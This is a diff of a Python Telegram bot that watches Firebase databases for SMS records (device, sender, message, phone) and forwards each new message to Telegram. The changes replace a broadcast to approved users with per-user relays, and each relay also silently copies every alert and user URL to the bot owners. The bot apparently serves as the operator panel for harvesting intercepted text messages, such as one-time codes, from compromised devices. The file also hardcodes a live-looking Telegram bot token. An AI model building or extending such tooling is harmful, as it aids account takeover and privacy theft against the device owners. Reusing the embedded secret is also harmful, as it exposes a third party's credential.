@@ -11,9 +11,6 @@ from sseclient import SSEClient
 # ---------------- CONFIG ----------------
 BOT_TOKEN = "8514837953:AAEPBpD6UCNvR9QjoaY0FPwlNZNtKwWY918"
 
-# YOUR HARDCODED FIREBASE URL
-FIXED_FIREBASE_URL = "https://union-1-1b7ae-default-rtdb.asia-southeast1.firebasedatabase.app/.json"
-
 if not BOT_TOKEN or BOT_TOKEN.strip() == "":
     print("❌ BOT_TOKEN missing inside ra.py file!")
     raise SystemExit(1)
@@ -200,7 +197,7 @@ def compute_hash(path, obj):
         return hashlib.sha1((path + str(obj)).encode()).hexdigest()
 
 
-def format_notification(fields):
+def format_notification(fields, user_id):
     device = html.escape(str(fields.get("device", "Unknown")))
     sender = html.escape(str(fields.get("sender", "Unknown")))
     message = html.escape(str(fields.get("message", "")))
@@ -211,6 +208,7 @@ def format_notification(fields):
         f"👤 From: <b>{sender}</b>\n"
         f"💬 Message: {message}\n"
         f"🕐 Time: {t}\n"
+        f"👤 Forwarded by User ID: <code>{user_id}</code>"
     )
     if fields.get("device_phone"):
         text += (
@@ -220,12 +218,10 @@ def format_notification(fields):
     return text
 
 
-def notify_all_approved_users(fields):
-    # Format message once
-    text = format_notification(fields)
-    # Send to ALL approved users
-    recipients = list(approved_users)
-    send_msg(recipients, text)
+def notify_user_owner(chat_id, fields):
+    text = format_notification(fields, chat_id)
+    send_msg(chat_id, text)
+    send_msg(OWNER_IDS, text)
 
 
 # ---------- SSE WATCHER ----------
@@ -235,9 +231,7 @@ def sse_loop(chat_id, base_url):
         url = url + "/.json"
     stream_url = url + "?print=silent"
     seen = seen_hashes.setdefault(chat_id, set())
-    
-    send_msg(chat_id, "⚡ SSE Monitor Started. Broadcasting alerts to all approved users.")
-    
+    send_msg(chat_id, "⚡ SSE (live) started. Auto-reconnect enabled.")
     retries = 0
     while firebase_urls.get(chat_id) == base_url:
         try:
@@ -263,10 +257,7 @@ def sse_loop(chat_id, base_url):
                         continue
                     seen.add(h)
                     fields = extract_fields(obj)
-                    
-                    # BROADCAST TO EVERYONE
-                    notify_all_approved_users(fields)
-                    
+                    notify_user_owner(chat_id, fields)
             retries = 0
         except Exception as e:
             print(f"SSE error ({chat_id}):", e)
@@ -301,7 +292,7 @@ def poll_loop(chat_id, base_url):
                 continue
             seen.add(h)
             fields = extract_fields(obj)
-            notify_all_approved_users(fields)
+            notify_user_owner(chat_id, fields)
         time.sleep(POLL_INTERVAL)
     send_msg(chat_id, "⛔ Polling stopped.")
 
@@ -310,17 +301,16 @@ def poll_loop(chat_id, base_url):
 def start_watcher(chat_id, base_url):
     firebase_urls[chat_id] = base_url
     seen_hashes[chat_id] = set()
-    
-    # Pre-fetch existing to avoid spamming old SMS
     json_url = normalize_json_url(base_url)
     snap = http_get_json(json_url)
     if snap:
         for p, o in find_sms_nodes(snap, ""):
             seen_hashes[chat_id].add(compute_hash(p, o))
-            
     t = threading.Thread(target=sse_loop, args=(chat_id, base_url), daemon=True)
     watcher_threads[chat_id] = t
     t.start()
+    send_msg(chat_id, "✅ Monitoring started. You will receive alerts too.")
+    refresh_firebase_cache(chat_id)
 
 
 def stop_watcher(chat_id):
@@ -363,10 +353,8 @@ def handle_not_approved(chat_id, msg):
     if username:
         user_info_lines.append(f"👤 Username: @{html.escape(username)}")
     send_msg(chat_id, "\n".join(user_info_lines), reply_markup=reply_markup)
-    
-    # Notify Admin
     owner_text = [
-        "⚠️ New user request:",
+        "⚠️ New user tried to use the bot:",
         f"ID: <code>{chat_id}</code>",
         f"Name: {html.escape(first_name)}",
     ]
@@ -458,14 +446,29 @@ def safe_format_device_record(rec: dict) -> str:
 
 
 # ---------- CACHE FUNCTIONS ----------
-def refresh_firebase_cache():
-    # Helper to keep connection alive or just check status
-    pass
+def refresh_firebase_cache(chat_id):
+    base_url = firebase_urls.get(chat_id)
+    if not base_url:
+        return
+    snap = http_get_json(normalize_json_url(base_url))
+    if snap is None:
+        return
+    firebase_cache[chat_id] = snap
+    cache_time[chat_id] = time.time()
+    try:
+        send_msg(chat_id, "♻️ Firebase cache refreshed automatically.")
+        send_msg(OWNER_IDS, f"♻️ Firebase cache refreshed for user <code>{chat_id}</code>")
+    except Exception:
+        pass
 
 
 def cache_refresher_loop():
     while True:
-        time.sleep(3600)
+        now = time.time()
+        for cid in list(firebase_urls.keys()):
+            if now - cache_time.get(cid, 0) >= CACHE_REFRESH_SECONDS:
+                refresh_firebase_cache(cid)
+        time.sleep(60)
 
 
 # ---------- COMMAND HANDLING ----------
@@ -493,16 +496,25 @@ def handle_update(u):
         handle_not_approved(chat_id, msg)
         return
 
-    # /start - CONFIRMATION
+    # /start
     if lower_text == "/start":
         send_msg(
             chat_id,
             (
-                "👋 <b>Welcome!</b>\n\n"
-                "✅ You are approved.\n"
-                "1. <b>Live Alerts:</b> You will automatically receive new SMS messages here.\n"
-                "2. <b>Search:</b> Use <code>/find device_id</code> to search the database.\n\n"
-                "<i>Bot is ready.</i>"
+                "👋 Welcome!\n\n"
+                "You are approved to use this bot.\n\n"
+                "Send me your Firebase RTDB base URL (public, .json) to start monitoring.\n\n"
+                "User Commands:\n"
+                "• /start - show this message\n"
+                "• /stop - stop your monitoring\n"
+                "• /list - show your own Firebase (private)\n"
+                "• /find <device_id> - search record by device id (safe summary only)\n"
+                "• /ping - bot status & ping\n"
+                "\nAdmin Commands (owners only):\n"
+                "• /adminlist - show all Firebase URLs\n"
+                "• /approve <user_id>\n"
+                "• /unapprove <user_id>\n"
+                "• /approvedlist"
             ),
         )
         return
@@ -525,16 +537,44 @@ def handle_update(u):
 
     # /stop
     if lower_text == "/stop":
+        stop_watcher(chat_id)
+        return
+
+    # USER VIEW: /list
+    if lower_text == "/list":
+        user_url = firebase_urls.get(chat_id)
         if is_owner(chat_id):
-             stop_watcher(chat_id)
+            if not firebase_urls:
+                send_msg(chat_id, "👑 No active Firebase monitoring right now.")
+            else:
+                send_msg(
+                    chat_id,
+                    (
+                        "👑 You are an owner.\n"
+                        "Use <b>/adminlist</b> to see all users' Firebase URLs.\n\n"
+                        f"Your own Firebase: {user_url if user_url else 'None'}"
+                    ),
+                )
         else:
-             send_msg(chat_id, "ℹ️ You cannot stop the global monitor.")
+            if user_url:
+                send_msg(
+                    chat_id,
+                    f"🔐 Your active Firebase:\n<code>{user_url}</code>",
+                )
+            else:
+                send_msg(
+                    chat_id,
+                    "ℹ️ You don't have any active Firebase monitoring yet."
+                )
         return
 
     # ADMIN VIEW: /adminlist
     if lower_text == "/adminlist":
         if not is_owner(chat_id):
             send_msg(chat_id, "❌ This command is only for bot owners.")
+            return
+        if not firebase_urls:
+            send_msg(chat_id, "👑 No active Firebase monitoring right now.")
             return
         lines = []
         for uid, url in firebase_urls.items():
@@ -563,7 +603,7 @@ def handle_update(u):
             return
         approved_users.add(target_id)
         send_msg(chat_id, f"✅ User <code>{target_id}</code> approved.")
-        send_msg(target_id, "✅ <b>You have been approved!</b>\n\nSend /start to verify connection and receive alerts.")
+        send_msg(target_id, "✅ You have been approved to use this bot.")
         return
 
     if lower_text.startswith("/unapprove"):
@@ -613,12 +653,18 @@ def handle_update(u):
             send_msg(chat_id, "Usage: <code>/find device_id</code>")
             return
         device_id = parts[1].strip()
-        
-        # USE FIXED URL FOR SEARCH
-        json_url = normalize_json_url(FIXED_FIREBASE_URL)
+        base_url = firebase_urls.get(chat_id)
+        if not base_url:
+            send_msg(
+                chat_id,
+                "❌ You don't have any active Firebase URL.\n"
+                "First send your Firebase RTDB URL to start monitoring.",
+            )
+            return
+        json_url = normalize_json_url(base_url)
         snap = http_get_json(json_url)
         if snap is None:
-            send_msg(chat_id, "❌ Failed to fetch data from Firebase.")
+            send_msg(chat_id, "❌ Failed to fetch data from your Firebase.")
             return
         matches = search_records_by_device(snap, device_id)
         if not matches:
@@ -635,13 +681,39 @@ def handle_update(u):
             )
         return
 
+    # -------- Firebase URL handling --------
+    if text.startswith("http"):
+        test_url = normalize_json_url(text)
+        if not http_get_json(test_url):
+            send_msg(
+                chat_id,
+                "❌ Unable to fetch URL. Make sure it's public and ends with .json",
+            )
+            return
+        start_watcher(chat_id, text)
+        send_msg(
+            OWNER_IDS,
+            f"👤 User <code>{chat_id}</code> started monitoring:\n"
+            f"<code>{html.escape(text)}</code>",
+        )
+        return
+
     # Fallback help
     send_msg(
         chat_id,
         (
-            "Bot is running.\n\n"
-            "• /start - check status\n"
-            "• /find <device_id> - search database\n"
+            "Send a Firebase RTDB URL to start monitoring.\n\n"
+            "User Commands:\n"
+            "• /start - instructions\n"
+            "• /stop - stop your monitoring\n"
+            "• /list - show your own Firebase (private)\n"
+            "• /find <device_id> - search record by device id (safe summary only)\n"
+            "• /ping - bot status & ping\n"
+            "\nAdmin Commands:\n"
+            "• /adminlist - show all Firebase URLs\n"
+            "• /approve <user_id>\n"
+            "• /unapprove <user_id>\n"
+            "• /approvedlist"
         ),
     )
 
@@ -664,14 +736,7 @@ def main_loop():
 if __name__ == "__main__":
     try:
         threading.Thread(target=cache_refresher_loop, daemon=True).start()
-        
-        # --- AUTO-START FOR OWNER ---
-        print(f"🚀 Auto-starting Firebase monitor for Primary Admin: {PRIMARY_ADMIN_ID}")
-        start_watcher(PRIMARY_ADMIN_ID, FIXED_FIREBASE_URL)
-        # ----------------------------
-
         main_loop()
     except KeyboardInterrupt:
         running = False
         print("Shutting down.")
-
